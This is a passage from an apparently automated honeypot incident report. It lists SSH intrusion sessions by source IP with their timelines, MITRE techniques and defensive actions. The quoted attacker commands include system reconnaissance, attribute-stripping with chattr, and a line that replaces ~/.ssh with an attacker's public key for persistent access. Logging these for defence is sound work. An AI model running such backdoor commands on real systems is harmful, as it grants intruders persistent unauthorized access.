| `2026-07-04 03:06:30` | `cowrie.client.kex` |
| `2026-07-04 03:06:31` | `cowrie.login.success` |
| `2026-07-04 03:06:32` | `cowrie.session.params` |
| `2026-07-04 03:06:32` | `cowrie.command.input` |
| `2026-07-04 03:06:32` | `cowrie.command.failed` |
| `2026-07-04 03:06:32` | `cowrie.log.closed` |
| `2026-07-04 03:06:34` | `cowrie.session.params` |
| `2026-07-04 03:06:34` | `cowrie.command.input` |
| `2026-07-04 03:06:35` | `cowrie.session.file_download` |
| `2026-07-04 03:06:35` | `cowrie.log.closed` |
| `2026-07-04 03:06:52` | `cowrie.session.params` |
| `2026-07-04 03:06:52` | `cowrie.command.input` |
| `2026-07-04 03:06:52` | `cowrie.log.closed` |
| `2026-07-04 03:06:53` | `cowrie.session.params` |
| `2026-07-04 03:06:53` | `cowrie.command.input` |
| `2026-07-04 03:06:53` | `cowrie.log.closed` |
| `2026-07-04 03:06:54` | `cowrie.session.params` |
| `2026-07-04 03:06:54` | `cowrie.command.input` |
| `2026-07-04 03:06:54` | `cowrie.session.file_download` |
| `2026-07-04 03:06:54` | `cowrie.log.closed` |
| `2026-07-04 03:06:55` | `cowrie.session.params` |
| `2026-07-04 03:06:55` | `cowrie.command.input` |
| `2026-07-04 03:06:56` | `cowrie.log.closed` |
| `2026-07-04 03:06:57` | `cowrie.session.params` |
| `2026-07-04 03:06:57` | `cowrie.command.input` |
| `2026-07-04 03:06:57` | `cowrie.log.closed` |
| `2026-07-04 03:06:58` | `cowrie.session.params` |
| `2026-07-04 03:06:58` | `cowrie.command.input` |
| `2026-07-04 03:06:58` | `cowrie.command.input` |
| `2026-07-04 03:06:59` | `cowrie.log.closed` |
| `2026-07-04 03:07:00` | `cowrie.session.params` |
| `2026-07-04 03:07:00` | `cowrie.command.input` |
| `2026-07-04 03:07:01` | `cowrie.log.closed` |
| `2026-07-04 03:07:02` | `cowrie.session.params` |
| `2026-07-04 03:07:02` | `cowrie.command.input` |
| `2026-07-04 03:07:03` | `cowrie.log.closed` |
| `2026-07-04 03:07:04` | `cowrie.session.params` |
| `2026-07-04 03:07:04` | `cowrie.command.input` |
| `2026-07-04 03:07:04` | `cowrie.log.closed` |
| `2026-07-04 03:07:05` | `cowrie.session.params` |
| `2026-07-04 03:07:05` | `cowrie.command.input` |
| `2026-07-04 03:07:05` | `cowrie.log.closed` |
| `2026-07-04 03:07:06` | `cowrie.session.params` |
| `2026-07-04 03:07:06` | `cowrie.command.input` |
| `2026-07-04 03:07:06` | `cowrie.log.closed` |
| `2026-07-04 03:07:07` | `cowrie.session.params` |
| `2026-07-04 03:07:07` | `cowrie.command.input` |
| `2026-07-04 03:07:08` | `cowrie.log.closed` |
| `2026-07-04 03:07:09` | `cowrie.session.params` |
| `2026-07-04 03:07:09` | `cowrie.command.input` |
| `2026-07-04 03:07:09` | `cowrie.log.closed` |
| `2026-07-04 03:07:10` | `cowrie.session.params` |
| `2026-07-04 03:07:10` | `cowrie.command.input` |
| `2026-07-04 03:07:10` | `cowrie.log.closed` |
| `2026-07-04 03:07:11` | `cowrie.session.params` |
| `2026-07-04 03:07:11` | `cowrie.command.input` |
| `2026-07-04 03:07:12` | `cowrie.log.closed` |
| `2026-07-04 03:07:13` | `cowrie.session.params` |
| `2026-07-04 03:07:13` | `cowrie.command.input` |
| `2026-07-04 03:07:13` | `cowrie.log.closed` |
| `2026-07-04 03:07:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `121.229.25[.]10` to AbuseIPDB if not already reported
- [ ] Block `121.229.25[.]10` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-36bf751522b5

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]7` |
| **First Seen** | 2026-07-04 03:06 |
| **Last Seen** | 2026-07-04 03:06 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 03:06:44` | `cowrie.session.connect` |
| `2026-07-04 03:06:44` | `cowrie.client.version` |
| `2026-07-04 03:06:44` | `cowrie.client.kex` |
| `2026-07-04 03:06:44` | `cowrie.login.success` |
| `2026-07-04 03:06:45` | `cowrie.session.params` |
| `2026-07-04 03:06:45` | `cowrie.command.input` |
| `2026-07-04 03:06:45` | `cowrie.command.input` |
| `2026-07-04 03:06:45` | `cowrie.command.input` |
| `2026-07-04 03:06:45` | `cowrie.command.input` |
| `2026-07-04 03:06:45` | `cowrie.command.input` |
| `2026-07-04 03:06:45` | `cowrie.command.success` |
| `2026-07-04 03:06:45` | `cowrie.command.input` |
| `2026-07-04 03:06:45` | `cowrie.command.input` |
| `2026-07-04 03:06:45` | `cowrie.command.input` |
| `2026-07-04 03:06:45` | `cowrie.command.input` |
| `2026-07-04 03:06:46` | `cowrie.log.closed` |
| `2026-07-04 03:06:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]7` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]7` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-edf7697f56e7

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-07-04 03:07 |
| **Last Seen** | 2026-07-04 03:07 |
| **Session Duration** | 12s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 03:07:19` | `cowrie.session.connect` |
| `2026-07-04 03:07:20` | `cowrie.client.version` |
| `2026-07-04 03:07:20` | `cowrie.client.kex` |
| `2026-07-04 03:07:26` | `cowrie.login.success` |
| `2026-07-04 03:07:30` | `cowrie.session.params` |
| `2026-07-04 03:07:30` | `cowrie.command.input` |
| `2026-07-04 03:07:32` | `cowrie.log.closed` |
| `2026-07-04 03:07:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-03680904448f

| Field | Detail |
|---|---|
| **Source IP** | `118.145.102[.]69` |
| **First Seen** | 2026-07-04 03:08 |
| **Last Seen** | 2026-07-04 03:13 |
| **Session Duration** | 301s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh` |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 03:08:06` | `cowrie.session.connect` |
| `2026-07-04 03:08:06` | `cowrie.client.version` |
| `2026-07-04 03:08:06` | `cowrie.client.kex` |
| `2026-07-04 03:08:07` | `cowrie.login.success` |
| `2026-07-04 03:08:08` | `cowrie.session.params` |
| `2026-07-04 03:08:08` | `cowrie.command.input` |
| `2026-07-04 03:08:08` | `cowrie.command.failed` |
| `2026-07-04 03:13:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `118.145.102[.]69` to AbuseIPDB if not already reported
- [ ] Block `118.145.102[.]69` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f1e60993e139

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]7` |
| **First Seen** | 2026-07-04 03:08 |
| **Last Seen** | 2026-07-04 03:08 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 03:08:14` | `cowrie.session.connect` |
| `2026-07-04 03:08:14` | `cowrie.client.version` |
| `2026-07-04 03:08:14` | `cowrie.client.kex` |
| `2026-07-04 03:08:14` | `cowrie.login.success` |
| `2026-07-04 03:08:16` | `cowrie.session.params` |
| `2026-07-04 03:08:16` | `cowrie.command.input` |
| `2026-07-04 03:08:16` | `cowrie.command.input` |
| `2026-07-04 03:08:16` | `cowrie.command.input` |
| `2026-07-04 03:08:16` | `cowrie.command.input` |
| `2026-07-04 03:08:16` | `cowrie.command.input` |
| `2026-07-04 03:08:16` | `cowrie.command.success` |
| `2026-07-04 03:08:16` | `cowrie.command.input` |
| `2026-07-04 03:08:16` | `cowrie.command.input` |
| `2026-07-04 03:08:16` | `cowrie.command.input` |
| `2026-07-04 03:08:16` | `cowrie.command.input` |
| `2026-07-04 03:08:16` | `cowrie.log.closed` |
| `2026-07-04 03:08:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]7` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]7` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-220f2edf2b61

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]7` |
| **First Seen** | 2026-07-04 03:09 |
| **Last Seen** | 2026-07-04 03:09 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 03:09:51` | `cowrie.session.connect` |
| `2026-07-04 03:09:51` | `cowrie.client.version` |
| `2026-07-04 03:09:51` | `cowrie.client.kex` |
| `2026-07-04 03:09:51` | `cowrie.login.success` |
| `2026-07-04 03:09:52` | `cowrie.session.params` |
| `2026-07-04 03:09:52` | `cowrie.command.input` |
| `2026-07-04 03:09:52` | `cowrie.command.input` |
| `2026-07-04 03:09:52` | `cowrie.command.input` |
| `2026-07-04 03:09:52` | `cowrie.command.input` |
| `2026-07-04 03:09:52` | `cowrie.command.input` |
| `2026-07-04 03:09:52` | `cowrie.command.success` |
| `2026-07-04 03:09:52` | `cowrie.command.input` |
| `2026-07-04 03:09:52` | `cowrie.command.input` |
| `2026-07-04 03:09:52` | `cowrie.command.input` |
| `2026-07-04 03:09:52` | `cowrie.command.input` |
| `2026-07-04 03:09:53` | `cowrie.log.closed` |
| `2026-07-04 03:09:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]7` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]7` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a53a6ba30368

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]7` |
| **First Seen** | 2026-07-04 03:11 |
| **Last Seen** | 2026-07-04 03:11 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 03:11:37` | `cowrie.session.connect` |
| `2026-07-04 03:11:37` | `cowrie.client.version` |
| `2026-07-04 03:11:37` | `cowrie.client.kex` |
| `2026-07-04 03:11:37` | `cowrie.login.success` |
| `2026-07-04 03:11:38` | `cowrie.session.params` |
| `2026-07-04 03:11:38` | `cowrie.command.input` |
| `2026-07-04 03:11:38` | `cowrie.command.input` |
| `2026-07-04 03:11:38` | `cowrie.command.input` |
| `2026-07-04 03:11:38` | `cowrie.command.input` |
| `2026-07-04 03:11:38` | `cowrie.command.input` |
| `2026-07-04 03:11:38` | `cowrie.command.success` |
| `2026-07-04 03:11:38` | `cowrie.command.input` |
| `2026-07-04 03:11:38` | `cowrie.command.input` |
| `2026-07-04 03:11:38` | `cowrie.command.input` |
| `2026-07-04 03:11:38` | `cowrie.command.input` |
| `2026-07-04 03:11:39` | `cowrie.log.closed` |
| `2026-07-04 03:11:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]7` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]7` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7f6298cd9f8f

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]7` |
| **First Seen** | 2026-07-04 03:13 |
| **Last Seen** | 2026-07-04 03:13 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 03:13:39` | `cowrie.session.connect` |
| `2026-07-04 03:13:39` | `cowrie.client.version` |
| `2026-07-04 03:13:39` | `cowrie.client.kex` |
| `2026-07-04 03:13:39` | `cowrie.login.success` |
| `2026-07-04 03:13:40` | `cowrie.session.params` |
| `2026-07-04 03:13:40` | `cowrie.command.input` |
| `2026-07-04 03:13:40` | `cowrie.command.input` |
| `2026-07-04 03:13:40` | `cowrie.command.input` |
| `2026-07-04 03:13:40` | `cowrie.command.input` |
| `2026-07-04 03:13:40` | `cowrie.command.input` |
| `2026-07-04 03:13:40` | `cowrie.command.success` |
| `2026-07-04 03:13:40` | `cowrie.command.input` |
| `2026-07-04 03:13:40` | `cowrie.command.input` |
| `2026-07-04 03:13:40` | `cowrie.command.input` |
| `2026-07-04 03:13:40` | `cowrie.command.input` |
| `2026-07-04 03:13:41` | `cowrie.log.closed` |
| `2026-07-04 03:13:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]7` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]7` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bbb6e828fc08

| Field | Detail |
|---|---|
| **Source IP** | `118.145.102[.]69` |
| **First Seen** | 2026-07-04 03:15 |
| **Last Seen** | 2026-07-04 03:15 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 03:15:23` | `cowrie.session.connect` |
| `2026-07-04 03:15:23` | `cowrie.client.version` |
| `2026-07-04 03:15:24` | `cowrie.client.kex` |
| `2026-07-04 03:15:25` | `cowrie.login.success` |
| `2026-07-04 03:15:26` | `cowrie.session.params` |
| `2026-07-04 03:15:26` | `cowrie.command.input` |
| `2026-07-04 03:15:26` | `cowrie.command.failed` |
| `2026-07-04 03:15:26` | `cowrie.log.closed` |
| `2026-07-04 03:15:27` | `cowrie.session.params` |
| `2026-07-04 03:15:27` | `cowrie.command.input` |
| `2026-07-04 03:15:28` | `cowrie.session.file_download` |
| `2026-07-04 03:15:28` | `cowrie.log.closed` |
| `2026-07-04 03:15:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `118.145.102[.]69` to AbuseIPDB if not already reported
- [ ] Block `118.145.102[.]69` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e65688aa2f98

| Field | Detail |
|---|---|
| **Source IP** | `118.145.102[.]69` |
| **First Seen** | 2026-07-04 03:15 |
| **Last Seen** | 2026-07-04 03:15 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 03:15:29` | `cowrie.session.connect` |
| `2026-07-04 03:15:29` | `cowrie.client.version` |
| `2026-07-04 03:15:29` | `cowrie.client.kex` |
| `2026-07-04 03:15:30` | `cowrie.login.success` |
| `2026-07-04 03:15:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `118.145.102[.]69` to AbuseIPDB if not already reported
- [ ] Block `118.145.102[.]69` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-679220aca1e0

| Field | Detail |
|---|---|
| **Source IP** | `118.145.102[.]69` |
| **First Seen** | 2026-07-04 03:15 |
| **Last Seen** | 2026-07-04 03:15 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 03:15:31` | `cowrie.session.connect` |
| `2026-07-04 03:15:31` | `cowrie.client.version` |
| `2026-07-04 03:15:31` | `cowrie.client.kex` |
| `2026-07-04 03:15:33` | `cowrie.login.success` |
| `2026-07-04 03:15:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `118.145.102[.]69` to AbuseIPDB if not already reported
- [ ] Block `118.145.102[.]69` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4a580ca8c0f4

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]7` |
| **First Seen** | 2026-07-04 03:16 |
| **Last Seen** | 2026-07-04 03:16 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 03:16:07` | `cowrie.session.connect` |
| `2026-07-04 03:16:07` | `cowrie.client.version` |
| `2026-07-04 03:16:07` | `cowrie.client.kex` |
| `2026-07-04 03:16:08` | `cowrie.login.success` |
| `2026-07-04 03:16:08` | `cowrie.session.params` |
| `2026-07-04 03:16:08` | `cowrie.command.input` |
| `2026-07-04 03:16:08` | `cowrie.command.input` |
| `2026-07-04 03:16:08` | `cowrie.command.input` |
| `2026-07-04 03:16:08` | `cowrie.command.input` |
| `2026-07-04 03:16:08` | `cowrie.command.input` |
| `2026-07-04 03:16:08` | `cowrie.command.success` |
| `2026-07-04 03:16:08` | `cowrie.command.input` |
| `2026-07-04 03:16:08` | `cowrie.command.input` |
| `2026-07-04 03:16:08` | `cowrie.command.input` |
| `2026-07-04 03:16:08` | `cowrie.command.input` |
| `2026-07-04 03:16:08` | `cowrie.log.closed` |
| `2026-07-04 03:16:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]7` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]7` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b5f67ee76395

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]7` |
| **First Seen** | 2026-07-04 03:18 |
| **Last Seen** | 2026-07-04 03:18 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 03:18:55` | `cowrie.session.connect` |
| `2026-07-04 03:18:55` | `cowrie.client.version` |
| `2026-07-04 03:18:55` | `cowrie.client.kex` |
| `2026-07-04 03:18:56` | `cowrie.login.success` |
| `2026-07-04 03:18:57` | `cowrie.session.params` |
| `2026-07-04 03:18:57` | `cowrie.command.input` |
| `2026-07-04 03:18:57` | `cowrie.command.input` |
| `2026-07-04 03:18:57` | `cowrie.command.input` |
| `2026-07-04 03:18:57` | `cowrie.command.input` |
| `2026-07-04 03:18:57` | `cowrie.command.input` |
| `2026-07-04 03:18:57` | `cowrie.command.success` |
| `2026-07-04 03:18:57` | `cowrie.command.input` |
| `2026-07-04 03:18:57` | `cowrie.command.input` |
| `2026-07-04 03:18:57` | `cowrie.command.input` |
| `2026-07-04 03:18:57` | `cowrie.command.input` |
| `2026-07-04 03:18:57` | `cowrie.log.closed` |
| `2026-07-04 03:18:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]7` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]7` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b15739e7ae57

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-07-04 03:19 |
| **Last Seen** | 2026-07-04 03:19 |
| **Session Duration** | 13s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 03:19:40` | `cowrie.session.connect` |
| `2026-07-04 03:19:41` | `cowrie.client.version` |
| `2026-07-04 03:19:41` | `cowrie.client.kex` |
| `2026-07-04 03:19:48` | `cowrie.login.success` |
| `2026-07-04 03:19:52` | `cowrie.session.params` |
| `2026-07-04 03:19:52` | `cowrie.command.input` |
| `2026-07-04 03:19:53` | `cowrie.log.closed` |
| `2026-07-04 03:19:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-76a951c96d5b

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]7` |
| **First Seen** | 2026-07-04 03:22 |
| **Last Seen** | 2026-07-04 03:22 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
